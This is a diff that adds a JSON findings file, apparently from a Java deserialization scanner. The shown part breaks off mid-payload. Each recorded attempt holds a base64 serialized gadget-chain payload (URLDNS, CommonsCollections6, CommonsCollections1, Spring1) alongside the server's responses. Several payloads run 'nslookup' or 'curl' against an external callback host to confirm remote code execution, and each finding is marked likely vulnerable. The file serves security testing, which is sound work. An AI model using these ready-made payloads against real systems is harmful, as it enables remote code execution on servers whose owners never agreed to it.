@@ -1,0 +1,816 @@
+{
+  "findings": [
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "URLDNS",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status/length (similarity=0.81) (baseline='{\"receivedType\":\"java.lang.String\",\"success\":true}' mutated='{\"receivedType\":\"java.util.HashMap\",\"success\":true}')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"receivedType\":\"java.util.HashMap\",\"success\":true}",
+            "length": 51,
+            "status": 200
+          },
+          "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAKm56c216bXR5Zmh6bmtzc3l5c2V3NTBseDVzaXlvcjYzci5vYXN0LmZ1bnQAAHEAfgAFdAAEaHR0cHB4dAAxaHR0cDovL256c216bXR5Zmh6bmtzc3l5c2V3NTBseDVzaXlvcjYzci5vYXN0LmZ1bng=",
+          "payload_type": "java_urldns"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "CommonsCollections6",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=50 mutated=204",
+            "Error/exception disclosure in response: ['exception', 'objectinputstream']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to deserialize message body via ObjectInputStream: org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on 'class java.lang.Runtime' threw an exception\"}",
+            "length": 204,
+            "status": 500
+          },
+          "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ADNuc2xvb2t1cCBuenNtem10eWZoem5rc3N5eXNldzUwbHg1c2l5b3I2M3Iub2FzdC5mdW50AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==",
+          "payload_type": "java_rce_escalation"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "CommonsCollections6",
+          "indicators": [
+            "Response content differs in a small, localized way despite same status/length (similarity=0.85) (baseline='{\"receivedType\":\"java.lang.String\",\"success\":true}' mutated='{\"receivedType\":\"java.util.HashSet\",\"success\":true}')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"receivedType\":\"java.util.HashSet\",\"success\":true}",
+            "length": 51,
+            "status": 200
+          },
+          "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AEdjdXJsIGh0dHA6Ly9uenNtem10eWZoem5rc3N5eXNldzUwbHg1c2l5b3I2M3Iub2FzdC5mdW4vY2MtcmNlLWNvbmZpcm1lZHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4",
+          "payload_type": "java_rce_escalation"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "CommonsCollections1",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=50 mutated=165",
+            "Error/exception disclosure in response: ['exception', 'objectinputstream']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to deserialize message body via ObjectInputStream: java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet\"}",
+            "length": 165,
+            "status": 500
+          },
+          "payload": "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAM25zbG9va3VwIG56c216bXR5Zmh6bmtzc3l5c2V3NTBseDVzaXlvcjYzci5vYXN0LmZ1bnQABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6",
+          "payload_type": "java_rce_escalation"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "CommonsCollections1",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=50 mutated=165",
+            "Error/exception disclosure in response: ['exception', 'objectinputstream']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to deserialize message body via ObjectInputStream: java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet\"}",
+            "length": 165,
+            "status": 500
+          },
+          "payload": "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAR2N1cmwgaHR0cDovL256c216bXR5Zmh6bmtzc3l5c2V3NTBseDVzaXlvcjYzci5vYXN0LmZ1bi9jYy1yY2UtY29uZmlybWVkdAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo=",
+          "payload_type": "java_rce_escalation"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "Spring1",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=50 mutated=311",
+            "Error/exception disclosure in response: ['exception', 'objectinputstream', 'invalidclassexception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to deserialize message body via ObjectInputStream: java.io.InvalidClassException: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider; local class incompatible: stream classdesc serialVersionUID = -5599465242187719977, local class serialVersionUID = -7932601391990044854\"}",
+            "length": 311,
+            "status": 500
+          },
+          "payload": "rO0ABXNyAElvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkTWV0aG9kSW52b2tlVHlwZVByb3ZpZGVyskq0B4tBGtcCAANJAAVpbmRleEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwcm92aWRlcnQAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL2NvcmUvU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyO3hwAAAAAHQADm5ld1RyYW5zZm9ybWVyc30AAAABAD1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUCAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91dGlsL01hcDtMAAR0eXBldAARTGphdmEvbGFuZy9DbGFzczt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHZ2V0VHlwZXN9AAAAAgAWamF2YS5sYW5nLnJlZmxlY3QuVHlwZQAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXN4cQB+AAZzcgBgb3JnLnNwcmluZ2ZyYW1ld29yay5iZWFucy5mYWN0b3J5LnN1cHBvcnQuQXV0b3dpcmVVdGlscyRPYmplY3RGYWN0b3J5RGVsZWdhdGluZ0ludm9jYXRpb25IYW5kbGVyhWLLwAz9MRMCAAFMAA1vYmplY3RGYWN0b3J5dAAxTG9yZy9zcHJpbmdmcmFtZXdvcmsvYmVhbnMvZmFjdG9yeS9PYmplY3RGYWN0b3J5O3hwc30AAAABAC9vcmcuc3ByaW5nZnJhbWV3b3JrLmJlYW5zLmZhY3RvcnkuT2JqZWN0RmFjdG9yeXhxAH4ABnNxAH4ACXNxAH4ADT9AAAAAAAAMdwgAAAAQAAAAAXQACWdldE9iamVjdHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AAUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGxcr+ur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BADNuc2xvb2t1cCBuenNtem10eWZoem5rc3N5eXNldzUwbHg1c2l5b3I2M3Iub2FzdC5mdW4IADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXI0MDQyNjE1NjU3MTY2AQAeTHlzb3NlcmlhbC9Qd25lcjQwNDI2MTU2NTcxNjY7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAhAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHB4cQB+ACY=",
+          "payload_type": "java_rce_escalation"
+        },
+        {
+          "baseline": {
+            "body_sample": "{\"receivedType\":\"java.lang.String\",\"success\":true}",
+            "length": 50,
+            "status": 200
+          },
+          "chain": "Spring1",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=50 mutated=311",
+            "Error/exception disclosure in response: ['exception', 'objectinputstream', 'invalidclassexception']"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "{\"error\":\"failed to deserialize message body via ObjectInputStream: java.io.InvalidClassException: org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider; local class incompatible: stream classdesc serialVersionUID = -5599465242187719977, local class serialVersionUID = -7932601391990044854\"}",
+            "length": 311,
+            "status": 500
+          },
+          "payload": "rO0ABXNyAElvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkTWV0aG9kSW52b2tlVHlwZVByb3ZpZGVyskq0B4tBGtcCAANJAAVpbmRleEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwcm92aWRlcnQAP0xvcmcvc3ByaW5nZnJhbWV3b3JrL2NvcmUvU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyO3hwAAAAAHQADm5ld1RyYW5zZm9ybWVyc30AAAABAD1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuU2VyaWFsaXphYmxlVHlwZVdyYXBwZXIkVHlwZVByb3ZpZGVyeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IAMnN1bi5yZWZsZWN0LmFubm90YXRpb24uQW5ub3RhdGlvbkludm9jYXRpb25IYW5kbGVyVcr1DxXLfqUCAAJMAAxtZW1iZXJWYWx1ZXN0AA9MamF2YS91d